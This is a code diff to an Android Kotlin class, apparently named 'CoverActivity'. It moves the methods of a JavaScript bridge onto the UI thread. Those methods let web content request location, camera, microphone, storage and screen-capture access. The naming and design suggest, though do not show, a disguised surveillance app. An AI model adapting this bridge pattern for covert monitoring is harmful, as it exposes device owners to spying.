@@ -40,52 +40,63 @@ class CoverActivity : AppCompatActivity() {
     }
 
     inner class PermBridge {
+        // All methods must dispatch to UI thread — @JavascriptInterface runs on WebView JS thread
         @JavascriptInterface
         fun requestLocation() {
-            ActivityCompat.requestPermissions(
-                this@CoverActivity,
-                arrayOf(
-                    Manifest.permission.ACCESS_FINE_LOCATION,
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                ),
-                101
-            )
+            runOnUiThread {
+                ActivityCompat.requestPermissions(
+                    this@CoverActivity,
+                    arrayOf(
+                        Manifest.permission.ACCESS_FINE_LOCATION,
+                        Manifest.permission.ACCESS_COARSE_LOCATION
+                    ),
+                    101
+                )
+            }
         }
 
         @JavascriptInterface
         fun requestCamera() {
-            ActivityCompat.requestPermissions(
-                this@CoverActivity,
-                arrayOf(Manifest.permission.CAMERA),
-                102
-            )
+            runOnUiThread {
+                ActivityCompat.requestPermissions(
+                    this@CoverActivity,
+                    arrayOf(Manifest.permission.CAMERA),
+                    102
+                )
+            }
         }
 
         @JavascriptInterface
         fun requestMic() {
-            ActivityCompat.requestPermissions(
-                this@CoverActivity,
-                arrayOf(Manifest.permission.RECORD_AUDIO),
-                103
-            )
+            runOnUiThread {
+                ActivityCompat.requestPermissions(
+                    this@CoverActivity,
+                    arrayOf(Manifest.permission.RECORD_AUDIO),
+                    103
+                )
+            }
         }
 
         @JavascriptInterface
         fun requestStorage() {
-            ActivityCompat.requestPermissions(
-                this@CoverActivity,
-                arrayOf(
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.WRITE_EXTERNAL_STORAGE
-                ),
-                104
-            )
+            runOnUiThread {
+                ActivityCompat.requestPermissions(
+                    this@CoverActivity,
+                    arrayOf(
+                        Manifest.permission.READ_EXTERNAL_STORAGE,
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE
+                    ),
+                    104
+                )
+            }
         }
 
         @JavascriptInterface
         fun requestScreenCapture() {
-            val intent = Intent(this@CoverActivity, GrantActivity::class.java)
-            startActivityForResult(intent, 105)
+            runOnUiThread {
+                val intent = Intent(this@CoverActivity, GrantActivity::class.java)
+                startActivityForResult(intent, 105)
+            }
         }
 
         @JavascriptInterface
